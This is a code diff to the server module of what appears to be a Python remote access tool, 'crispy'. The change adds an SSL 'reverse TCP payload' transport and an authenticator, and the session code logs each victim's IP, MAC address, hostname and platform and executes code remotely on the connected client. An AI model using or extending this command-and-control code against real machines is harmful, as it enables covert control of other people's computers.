@@ -1,4 +1,3 @@
-import ConfigParser
 import crispy.modules
 import logging
 import pkgutil
@@ -9,19 +8,32 @@ logger = logging.getLogger(__name__)
 
 from .. network.server_type import RPyCServer
 from .. network.service import CrispyService
+from .. network.client_type import SSLClient
 from . client import CrispyClient
 from .. lib.fprint import *
 
 class CrispyServer(threading.Thread):
     """ Backend server methods for clients. """
 
-    def __init__(self, addr, port):
+    def __init__(self, addr, auth):
         super(CrispyServer, self).__init__()
         self.daemon = True
-        self.addr = addr
-        self.port = port
+        self.auth = auth
+        self.host = addr[0]
+        self.port = addr[1]
         self.srv = None
-
+        self.transport = {
+                "info": "Simple reverse TCP payload with SSL",
+                "server": self.srv,
+                "client": SSLClient,
+                "client_kwargs": {},
+                "authenticator": self.auth,
+                "stream": {},
+                "client_transport": {},
+                "server_transport": {},
+                "client_transport_kwargs": {},
+                "server_transport_kwargs": {},
+                }
         self.clients = []
         self.clients_lock = threading.Lock()
         self.current_id = 1
@@ -30,8 +42,8 @@ class CrispyServer(threading.Thread):
         """ Add new client to client list. """
         logger.debug("add_session(conn) was called")
         
-        _client_addr, _client_port = conn._conn._config['connid'].split(':')
-        logger.info("Session {} opened ({}:{} <- {}:{})".format(self.current_id, self.addr, self.port, _client_addr, _client_port))
+        _client_ip, _client_port = conn._conn._config['connid'].split(':')
+        logger.info("Session {} opened ({}:{} <- {}:{})".format(self.current_id, self.host, self.port, _client_ip, _client_port))
             
         conn.execute(textwrap.dedent(
         """
@@ -109,7 +121,7 @@ class CrispyServer(threading.Thread):
             cc = CrispyClient({
                 'conn'     : conn, 
                 'id'       : self.current_id, 
-                'ip'       : _client_addr, 
+                'ip'       : _client_ip, 
                 'macaddr'  : l[0], 
                 'hostname' : l[1], 
                 'plat'     : l[2], 
@@ -173,9 +185,9 @@ class CrispyServer(threading.Thread):
     def run(self):
         """ Server method that creates and starts the RPyC server. """
         logger.debug("run() was called")
-
+        
         try:
-            self.srv = RPyCServer(CrispyService, hostname=self.addr, port=self.port)
+            self.srv = RPyCServer(CrispyService, hostname=self.host, port=self.port, authenticator=self.auth)
             self.srv.start()
         except Exception as e:
             print e
